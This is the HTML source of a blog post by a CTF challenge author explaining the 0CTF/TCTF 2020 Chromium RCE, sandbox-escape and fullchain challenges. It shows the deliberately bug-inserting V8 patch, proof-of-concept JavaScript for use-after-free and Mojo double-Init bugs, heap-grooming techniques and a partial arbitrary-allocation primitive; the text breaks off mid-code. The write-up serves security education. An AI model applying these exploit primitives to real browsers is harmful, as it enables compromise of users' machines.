@@ -1,0 +1,827 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Chrome,CTF," />
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="First of all, this is the first browser-related CTF challenge I ever made. I’m very glad to see that players are actively participating. In the end, 29 teams solved Chromium RCE, 7 teams solved Chromi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF&#x2F;TCTF 2020 Chromium series challenge">
+<meta property="og:url" content="http://yoursite.com/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/index.html">
+<meta property="og:site_name" content="一年一更">
+<meta property="og:description" content="First of all, this is the first browser-related CTF challenge I ever made. I’m very glad to see that players are actively participating. In the end, 29 teams solved Chromium RCE, 7 teams solved Chromi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/twitter.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/mem1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/mem2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/gdb1.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/mem3.png">
+<meta property="article:published_time" content="2020-07-19T17:42:34.000Z">
+<meta property="article:modified_time" content="2020-07-19T19:24:31.007Z">
+<meta property="article:author" content="Gengming Liu">
+<meta property="article:tag" content="Chrome">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/twitter.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'xirong'
+    }
+  };
+</script>
+
+  <title> 0CTF/TCTF 2020 Chromium series challenge | 一年一更 </title>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">一年一更</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                0CTF/TCTF 2020 Chromium series challenge
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2020-07-20T01:42:34+08:00" content="2020-07-20">
+              2020-07-20
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/" class="leancloud_visitors" data-flag-title="0CTF/TCTF 2020 Chromium series challenge">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">visitors </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>First of all, this is the first browser-related CTF challenge I ever made. I’m very glad to see that players are actively participating. In the end, 29 teams solved Chromium RCE, 7 teams solved Chromium SBX and 2 teams solved Chromium Fullchain, huge props to all those teams.</p>
+<p>There are already several public write-ups and I have learned a lot from them. Nevertheless, I would like to provide a summary from my perspective and provide more details.</p>
+<a id="more"></a>
+
+<h2 id="Part-Ⅰ-Chromium-RCE"><a href="#Part-Ⅰ-Chromium-RCE" class="headerlink" title="Part Ⅰ: Chromium RCE"></a>Part Ⅰ: Chromium RCE</h2><p>Heap exploitation has been the most popular category in recent years’ CTFs. However, many players have already been tired of it, so we prepared something different - to do a glibc heap exploitation via JavaScript.</p>
+<figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq</span><br><span class="line">index b5c9dcb261..babe7da3f0 100644</span><br><span class="line"><span class="comment">--- a/src/builtins/typed-array-set.tq</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/typed-array-set.tq</span></span><br><span class="line">@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(</span><br><span class="line">     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].</span><br><span class="line">     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError</span><br><span class="line">     //   exception.</span><br><span class="line"><span class="deletion">-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;</span></span><br><span class="line"><span class="addition">+    const utarget = %RawDownCast&lt;AttachedJSTypedArray&gt;(target);</span></span><br><span class="line"></span><br><span class="line">     const overloadedArg = arguments[0];</span><br><span class="line">     try &#123;</span><br><span class="line">@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(</span><br><span class="line">       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].</span><br><span class="line">       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError</span><br><span class="line">       //   exception.</span><br><span class="line"><span class="deletion">-      const utypedArray =</span></span><br><span class="line"><span class="deletion">-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;</span></span><br><span class="line"><span class="addition">+      const utypedArray = %RawDownCast&lt;AttachedJSTypedArray&gt;(typedArray);</span></span><br><span class="line"></span><br><span class="line">       TypedArrayPrototypeSetTypedArray(</span><br><span class="line">           utarget, utypedArray, targetOffset, targetOffsetOverflowed)</span><br></pre></td></tr></table></figure>
+
+<p>The bug is trivial. We removed two DETACH checks in %TypedArray%.prototype.set, which gives us read/write primitive on a detached TypedArray. Besides, the ArrayBuffer Heap is managed by Glibc in d8 binary, so the situation is very similar to the traditional CTF heap challenge with four functions: Alloc, Delete, Show and Edit as follows:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Alloc</span></span><br><span class="line"><span class="keyword">let</span> helper_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="keyword">let</span> helper_ta = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(helper_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> victim_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="keyword">let</span> victim_ta = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(victim_ab);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete</span></span><br><span class="line">%ArrayBufferDetach(victim_ta);</span><br><span class="line"></span><br><span class="line"><span class="comment">// UAF Read/Show</span></span><br><span class="line">helper_ta.set(victim_ta, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(helper_ta);</span><br><span class="line"></span><br><span class="line"><span class="comment">// UAF Write/Edit</span></span><br><span class="line">helper_ta[<span class="number">0</span>] = <span class="number">0x41414141</span>;</span><br><span class="line">victim_ta.set(helper_ta, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>According to the writeups I received, most players used fastbin attack to overwrite the <code>malloc_hook_</code> with <code>one_gadget</code>, while some other players found a way to trigger malloc instead of calloc so the tcache attack works and makes it much easier.</p>
+<p>To solve the challenge, players only need to know(or learn) some basic knowledge of v8, along with glibc heap tricks(also basic for a CTF player). So it was no surprise that it became the lowest point in Pwn category, but I hope everyone had fun and learned something from it.</p>
+<h2 id="Part-Ⅱ-Chromium-SBX"><a href="#Part-Ⅱ-Chromium-SBX" class="headerlink" title="Part Ⅱ: Chromium SBX"></a>Part Ⅱ: Chromium SBX</h2><p>Before we start, I would like to apologize for our dumb mistake, which initialy made this challenge deemed infeasible. We have tweeted about it and thanks @owodelta again for pointing it out.</p>
+<p><img src="twitter.png" alt=""></p>
+<p>So the intended bug should be the double-init, which is also a famous bug pattern inside Chromium Sandbox. Let’s take a look at the patch after the fix:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// content/browser/tstorage/tstorage_impl.cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TStorageImpl::Init</span><span class="params">(InitCallback callback)</span> </span>&#123;</span><br><span class="line">    inner_db_ = <span class="built_in">std</span>::make_unique&lt;InnerDbImpl&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TStorageImpl::CreateInstance</span><span class="params">(CreateInstanceCallback callback)</span> </span>&#123;</span><br><span class="line">    mojo::PendingAssociatedRemote&lt;<span class="built_in">blink</span>::mojom::TInstance&gt; pending_remote;</span><br><span class="line">    <span class="keyword">auto</span> instance = <span class="built_in">std</span>::make_unique&lt;TInstanceImpl&gt;(inner_db_.<span class="built_in">get</span>());</span><br><span class="line">    instance_receivers_.Add(</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">move</span>(instance),</span><br><span class="line">            pending_remote.InitWithNewEndpointAndPassReceiver());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(<span class="built_in">std</span>::<span class="built_in">move</span>(pending_remote));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// third_party/blink/public/mojom/tstorage/tstorage.mojom</span></span><br><span class="line"></span><br><span class="line">interface TStorage &#123;</span><br><span class="line">    Init() =&gt; ();</span><br><span class="line">    CreateInstance() =&gt; (pending_associated_remote&lt;<span class="built_in">blink</span>.mojom.TInstance&gt;? instance);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>(Therefore, as we expected, there is only one way to trigger the bug by calling the <code>TStorageImpl::Init</code> twice. In such case, reseting TStorage pointer is useless since it will also invalidate all TInstances when it is deleted.)</p>
+<h3 id="Bug-analysis"><a href="#Bug-analysis" class="headerlink" title="Bug analysis"></a>Bug analysis</h3><p>There are two IPC calls of TStorage interface. The first IPC <code>Init</code> creates a new <code>InnerDbImpl</code> and binds the new database to <code>inner_db_</code>. The second IPC <code>CreateInstance</code> creates a <code>TInstanceImpl</code> which accepts the raw pointer of <code>inner_db_</code> for the construction, and sends it back to the Renderer Process.</p>
+<p>RawPtr is known to be very dangerous in C++ and developers need to be very careful about its lifetime. In this challenge, the owner of the database is <code>TStorageImpl::inner_db_</code>, which is a <code>std::unique_ptr</code> to an <code>InnerDbImpl</code>. If we make a second call to <code>Init</code>, the previous <code>inner_db_</code> will be replaced by a new one, causing the previous one to be released immediately. As a result, the raw pointer of the previous <code>inner_db_</code> in <code>TInstanceImpl</code> becomes a dangling pointer, which leads to UAF on <code>InnerDbImpl</code>.</p>
+<p>Thus, the PoC would look like this:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create TStorage</span></span><br><span class="line"><span class="keyword">let</span> tstorage = <span class="keyword">new</span> blink.mojom.TStoragePtr()</span><br><span class="line">Mojo.bindInterface(blink.mojom.TStorage.name,</span><br><span class="line">                   mojo.makeRequest(tstorage).handle, <span class="string">"context"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// First init</span></span><br><span class="line">tstorage.init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create TInstance</span></span><br><span class="line"><span class="keyword">let</span> instance = <span class="keyword">new</span> blink.mojom.TInstanceAssociatedPtr(</span><br><span class="line">    (<span class="keyword">await</span> tstorage.createInstance()).instance);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Second init</span></span><br><span class="line">tstorage.init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger UAF</span></span><br><span class="line">instance.getTotalSize();</span><br></pre></td></tr></table></figure>
+
+<h3 id="TCMalloc"><a href="#TCMalloc" class="headerlink" title="TCMalloc"></a>TCMalloc</h3><p>The next step is to reuse the memory of free’d <code>inner_db_</code>. According to the <a href="https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html" target="_blank" rel="noopener">great research from markbrand</a>, Blob looks perfect for our goal. However, some of you might have noticed, the situation may not be the same as you expected. The blob is hard to fill in the hole of <code>inner_db_</code>.</p>
+<p>Actually this is my second point in this challenge - TCMalloc. Chromium uses tcmalloc for its heap management. In the challenge, vulnerable objects are all running in the UI Thread, while blobs are allocated/released in the IO Thread, so they are landed on the different threads and it could be very difficult to fill in the hole from a different ThreadCache.</p>
+<p>Let’s take a look at the official introduction:</p>
+<blockquote>
+<p>TCMalloc assigns each thread a thread-local cache. Small allocations are satisfied from the thread-local cache. Objects are moved from central data structures into a thread-local cache as needed, and periodic garbage collections are used to migrate memory back from a thread-local cache into the central data structures.</p>
+</blockquote>
+<p>In summary, all mild operations on the heap are trapped in the thread. Each ThreadCache is unreachable from the other one. However, chunks in CentralThread could be moved to any ThreadCache, i.e. the chunks in the CentralThread could be accessed from any ThreadCache as needed.</p>
+<p>There are at least two approaches to do a reliable exploit. The first one is to move the victim to the CentralCache, so that we can easily take it off; the other one is to find some usable allocations in the same thread. We will talk about the first one here, and leave the second to you, which could be helpful in the bonus challenge :)</p>
+<p>According to the references of <code>ReleaseToCentralCache</code>, we have several approaches to achieve the migration. Let’s take a look at one path for example.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> ATTRIBUTE_ALWAYS_INLINE <span class="keyword">void</span> <span class="title">ThreadCache::Deallocate</span><span class="params">(<span class="keyword">void</span>* ptr, uint32 cl)</span> </span>&#123;</span><br><span class="line">  ASSERT(list_[cl].max_length() &gt; <span class="number">0</span>);</span><br><span class="line">  FreeList* <span class="built_in">list</span> = &amp;list_[cl];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This catches back-to-back frees of allocs in the same size</span></span><br><span class="line">  <span class="comment">// class. A more comprehensive (and expensive) test would be to walk</span></span><br><span class="line">  <span class="comment">// the entire freelist. But this might be enough to find some bugs.</span></span><br><span class="line">  ASSERT(ptr != <span class="built_in">list</span>-&gt;Next());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint32_t</span> length = <span class="built_in">list</span>-&gt;Push(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (PREDICT_FALSE(length &gt; <span class="built_in">list</span>-&gt;max_length())) &#123;</span><br><span class="line">    ListTooLong(<span class="built_in">list</span>, cl);  &lt;--------------------------------- [<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  size_ += <span class="built_in">list</span>-&gt;object_size();</span><br><span class="line">  <span class="keyword">if</span> (PREDICT_FALSE(size_ &gt; max_size_))&#123;  &lt;------------------- [<span class="number">2</span>]</span><br><span class="line">    Scavenge();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ThreadCache::ListTooLong</span><span class="params">(FreeList* <span class="built_in">list</span>, uint32 cl)</span> </span>&#123;</span><br><span class="line">  size_ += <span class="built_in">list</span>-&gt;object_size();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> batch_size = Static::sizemap()-&gt;num_objects_to_move(cl);</span><br><span class="line">  ReleaseToCentralCache(<span class="built_in">list</span>, cl, batch_size);  &lt;----------- victim is moved to CentralCache</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the list is too long, we need to transfer some number of</span></span><br><span class="line">  <span class="comment">// objects to the central cache.  Ideally, we would transfer</span></span><br><span class="line">  <span class="comment">// num_objects_to_move, so the code below tries to make max_length</span></span><br><span class="line">  <span class="comment">// converge on num_objects_to_move.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The above code snippet shows that, when the list is too long, some number of objects should be transferred to the central cache. So the solution is obvious. We only need to delete more databases after releasing the victim, and the linked list of the cache would be full. As a result, the free’d chunks will be moved to the CentralCache.</p>
+<p>(By the way, after the discussion with Tim Becker, we found <a href="https://theori.io/research/escaping-chrome-sandbox/" target="_blank" rel="noopener">his writeup</a> probably meets another condition[2]. After the huge destruction, the total size of the ThreadCache exceeds the <code>max_size_</code>, so it would do <code>Scavenge</code> and release the objects to the CentralCache.)</p>
+<h3 id="Infoleak"><a href="#Infoleak" class="headerlink" title="Infoleak"></a>Infoleak</h3><p>Now things are getting more general. Find a way to info leak then trigger the virtual call and do ROP. There are many materials from here, so I won’t go deep into it, however, I want to introduce a trick of <code>base::queue</code>.</p>
+<p><code>base::queue</code> is a four-pointer size structure which includes <code>container</code>, <code>capacity</code>, <code>front</code> and <code>rear</code>. If we leave everything zero, it will automatically init itself during the first <code>push</code> operation. It first allocates a container buffer for storing its elements, then stores the container pointer to itself. As a result, there is a heap pointer located at the blob and we can easily leak it out. (More details can be found in my talks)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">before init:</span><br><span class="line"></span><br><span class="line">           container        capacity</span><br><span class="line">    - | 0x000000000000 | 0x000000000000 |</span><br><span class="line">    - | 0x000000000000 | 0x000000000000 |</span><br><span class="line">            front             rear</span><br><span class="line">                       |</span><br><span class="line">                       |</span><br><span class="line">    after first push   |</span><br><span class="line">                       |</span><br><span class="line"> +------------+        |</span><br><span class="line"> |            |        v</span><br><span class="line"> |         container        capacity</span><br><span class="line"> |  - | 0x1f15101a3440 | 0x000000000004 |</span><br><span class="line"> |  - | 0x000000000000 | 0x000000000001 |</span><br><span class="line"> |          front             rear</span><br><span class="line"> |</span><br><span class="line"> +--&gt; 0x1f15101a3440(heap):</span><br><span class="line">    - | arr[0] | hole | hole | hole |</span><br></pre></td></tr></table></figure>
+
+<p>In addition, I do recommend <a href="https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html" target="_blank" rel="noopener">r3kapig’s writeup</a> for further <code>base::queue</code> tricks.</p>
+<p>Now we have got a heap address, we can then spray pages of heap which is first used by <a href="https://github.com/niklasb/hack2win-chrome" target="_blank" rel="noopener">niklasb and ned</a>. Or even better, we can use the <code>queue</code> itself to arrange the virtual table, since we are able to put any int64 on it.</p>
+<p>Finally, we trigger the virtual call, ROP our way and get the flag.</p>
+<h2 id="Part-Ⅲ-Chromium-Fullchain"><a href="#Part-Ⅲ-Chromium-Fullchain" class="headerlink" title="Part Ⅲ: Chromium Fullchain"></a>Part Ⅲ: Chromium Fullchain</h2><p>Finally we come to the finale.</p>
+<p>The vulnerabilities are almost the same as the previous. It seems we only need a little effort to stick them up. But the truth is, as you see, things became much more complicated.</p>
+<h3 id="ArrayBuffer-Neuter"><a href="#ArrayBuffer-Neuter" class="headerlink" title="ArrayBuffer Neuter"></a>ArrayBuffer Neuter</h3><p>The first obstacle is, I removed the native API <code>%ArrayBufferDetach</code>(Or we called it <code>ArrayBufferNeuter</code> some time ago) inside sandbox, so we should find a way to free the ArrayBuffer by ourselves.</p>
+<p>There is a well-known trick in browser security. Javascript allows buffers to be transferred from a source thread to a Worker thread, and the transferred buffers are not accessible (“neutered”) in the source thread. In Chrome, it would also release the buffer of the ArrayBuffer.</p>
+<p>After some research and experiments, we got the snippet of code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ENABLE_NATIVE = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ArrayBufferDetach</span>(<span class="params">ab</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ENABLE_NATIVE) &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">"%ArrayBufferDetach(ab);"</span>);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> w = <span class="keyword">new</span> Worker(<span class="string">''</span>);</span><br><span class="line">    w.postMessage(&#123;<span class="attr">ab</span>: ab&#125;, [ab]);</span><br><span class="line">    w.terminate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PartitionAlloc-Bypass"><a href="#PartitionAlloc-Bypass" class="headerlink" title="PartitionAlloc Bypass"></a>PartitionAlloc Bypass</h3><p>Compared with the previous challenges, the most difficult part of fullchain is Heap Exploitation. In Chromium RCE, d8 uses ptmalloc for the heap management. However, when Chrome browser takes over the heap management, the memory allocator turns to PartitionAlloc. According to the official introduction, PartitionAlloc could be regarded as a kind of mitigation. It greatly hardens the security of the heap.</p>
+<p>Around 2017, we(KeenLab) had several UAF bugs in ArrayBuffer Heap. I also tried to exploit them for Pwn2Own contest. I successfully pwned some of them on 32-bit arch(since the bug is used for Mobile Pwn2Own and browsers in the phone are 32-bit), but I have no idea about pwning it on 64-bit at that time. However, after the challenge, I find it is not unbreakable.</p>
+<p>Well, let’s start our journey of PartitionAlloc. Like most heap allocator, there is also a freelist in PartitionAlloc. We can find it at the first pointer of the free’d chunk in Big-Endian. Let’s take a look in the debugger.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> victim_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="keyword">let</span> victim_ta = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(victim_ab);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete</span></span><br><span class="line">%ArrayBufferDetach(victim_ta);</span><br></pre></td></tr></table></figure>
+
+<p><img src="mem1.png" alt=""></p>
+<p>Note: <code>0x205284e08000</code> is a free’d chunk and the next free’d chunk is <code>0x205284e08500</code>.</p>
+<p>It is almost the same as tcache attack, except for the endianness. Since we have full control of the heap, this is not a problem. So just like tcache attack, we are able to allocate to any address we want.</p>
+<p>Thus, together with the ArrayBufferDetach, we got the <code>arb_alloc</code> primitive.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">arb_alloc</span>(<span class="params">addr, size, ret=true</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(size);</span><br><span class="line">    <span class="keyword">let</span> a_ta = <span class="keyword">new</span> BigUint64Array(a_ab);</span><br><span class="line">    <span class="keyword">let</span> b_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(size);</span><br><span class="line">    <span class="keyword">let</span> b_ta = <span class="keyword">new</span> BigUint64Array(b_ab);</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">DataView</span>(b_ab).setBigUint64(<span class="number">0</span>, addr, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">await</span> 